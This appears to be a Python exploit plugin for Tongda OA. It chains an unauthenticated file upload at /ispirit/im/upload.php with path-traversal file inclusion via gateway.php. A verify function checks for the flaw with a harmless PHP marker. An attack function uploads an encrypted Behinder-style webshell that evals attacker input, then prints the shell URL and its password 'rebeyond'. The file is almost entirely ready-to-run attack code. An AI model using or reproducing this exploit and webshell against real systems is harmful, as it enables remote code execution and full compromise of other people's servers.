import requests
import urllib, re, random, string

def verify(url):
    relsult = {
        'name': '通达OA 任意文件包含+未授权文件上传',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://xz.aliyun.com/t/7424',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<?php echo "{randstr1}"."{randstr2}";?>'
    payload = '/ispirit/im/upload.php'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n\r\n2\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="P"\r\n\r\n\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="ATTACHMENT"; filename="jpg"\r\nContent-Type: image/jpeg\r\n\r\n{0}\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3--'.format(shell)
    verify_path = '/ispirit/interface/gateway.php?json={{"url":"/general/../../attach/im/{0}"}}'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('OK', rep.text):
            path = re.findall('@(.+)\|jpg', rep.text)[0].replace('_', '/') + '.jpg'
            verify_url = urllib.parse.urljoin(url, verify_path.format(path))
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '''<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>'''
    payload = '/ispirit/im/upload.php'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n\r\n2\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="P"\r\n\r\n\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="ATTACHMENT"; filename="jpg"\r\nContent-Type: image/jpeg\r\n\r\n{0}\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3--'.format(shell)
    verify_path = '/ispirit/interface/gateway.php?json={{"url":"/general/../../attach/im/{0}"}}'
    print('[+] exploit loading ......')
    try:
        print('[+] 开始上传 webshell')
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('OK', rep.text):
            path = re.findall('@(.+)\|jpg', rep.text)[0].replace('_', '/') + '.jpg'
            print('[+] 获取路径 path:', path)
            print('[+] 上传成功! 正在检测是否存在?')
            verify_url = urllib.parse.urljoin(url, verify_path.format(path))
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print('[*] webshell上传成功! status: 200')
                print('[*] webshell(冰蝎): ', verify_url)
                print('[*] 密码: rebeyond')
                return True
        return False
    except:
        return False